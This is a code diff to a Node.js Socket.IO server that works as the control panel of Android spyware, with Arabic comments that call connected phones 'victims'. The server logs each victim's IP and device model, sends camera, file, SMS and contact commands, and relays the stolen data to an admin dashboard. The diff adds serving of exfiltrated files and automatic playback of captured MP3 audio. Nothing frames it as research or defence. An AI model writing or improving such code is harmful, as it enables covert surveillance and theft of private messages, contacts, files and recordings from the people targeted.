@@ -10,7 +10,10 @@ const victimsList = require('./Victim');
 const DOWNLOADS_DIR = path.join(__dirname, 'downloads');
 fs.ensureDirSync(DOWNLOADS_DIR);
 
-// أوامر التحكم (نفس الأكواد من ملفك الأصلي)
+// متاح للوصول من المتصفح لتشغيل الملفات الصوتية
+app.use('/downloads', express.static(DOWNLOADS_DIR));
+
+// أوامر التحكم
 const orders = {
     camera: 'x0000ca',
     fileManager: 'x0000fm',
@@ -26,7 +29,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// دالة لتنظيف قائمة الضحايا قبل إرسالها للمتصفح (لتجنب الانهيار)
+// تنظيف قائمة الضحايا قبل الإرسال لتجنب تعليق السيرفر
 function getSafeVictimsList() {
     const allVictims = victimsList.getVictimList();
     const safeList = {};
@@ -43,34 +46,43 @@ function getSafeVictimsList() {
 }
 
 io.on('connection', (socket) => {
-
     const query = socket.handshake.query;
 
-    // حالة 1: المتصل هو الضحية (لديه query.id)
-    socket.on("upv",(d)=>{            
-        io.emit('update_victims', getSafeVictimsList())
-    })
-    if (query.id) {
+    // حدث لتحديث القائمة يدوياً من اللوحة
+    socket.on("upv", (d) => {            
+        io.emit('update_victims', getSafeVictimsList());
+    });
 
+    // إذا كان المتصل "ضحية"
+    if (query.id) {
         const address = socket.request.connection;
         const ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
         
-        // إضافة الضحية للقائمة الأصلية
         victimsList.addVictim(socket, ip, address.remotePort, 'Unknown', query.manf, query.model, query.release, query.id);
         console.log(`[+] ضحية متصل الآن: ${query.model} | IP: ${ip}`);
         
-        
-        // إبلاغ لوحة التحكم بالتحديث
+        // إرسال تحديث فوري للوحة التحكم
+        io.emit('update_victims', getSafeVictimsList());
 
-
-        // استقبال البيانات من الضحية
+        // استقبال البيانات
         socket.on(orders.sms, (data) => io.emit('data_received', { type: 'SMS', content: data }));
         socket.on(orders.contacts, (data) => io.emit('data_received', { type: 'Contacts', content: data }));
+        
         socket.on(orders.fileManager, (data) => {
             if (data.file === true) {
                 const filePath = path.join(DOWNLOADS_DIR, data.name);
                 fs.outputFile(filePath, data.buffer, (err) => {
-                    io.emit('log', err ? 'Error saving file' : 'File saved: ' + data.name);
+                    if (err) {
+                        io.emit('log', 'Error saving file: ' + data.name);
+                    } else {
+                        io.emit('log', 'File saved: ' + data.name);
+                        // إرسال تنبيه للمتصفح لتشغيل الملف إذا كان MP3
+                        io.emit('file_ready', {
+                            name: data.name,
+                            url: '/downloads/' + encodeURIComponent(data.name),
+                            isAudio: data.name.toLowerCase().endsWith('.mp3')
+                        });
+                    }
                 });
             }
             io.emit('data_received', { type: 'Files', content: data });
@@ -78,12 +90,11 @@ io.on('connection', (socket) => {
 
         socket.on('disconnect', () => {
             console.log(`[-] انقطع اتصال: ${query.id}`);
-            // هنا يفضل إضافة دالة في Victim.js لحذف الضحية عند الانفصال
             io.emit('update_victims', getSafeVictimsList());
         });
     }
-;
-    // حالة 2: المتصل هو "الأدمن" (لوحة التحكم)
+
+    // استقبال الأوامر من الأدمن
     socket.on('admin_command', (cmd) => {
         const allVictims = victimsList.getVictimList();
         const target = allVictims[cmd.targetId];
@@ -102,8 +113,6 @@ io.on('connection', (socket) => {
         }
     });
 });
-
-
 
 const PORT = 4444;
 http.listen(PORT, () => {
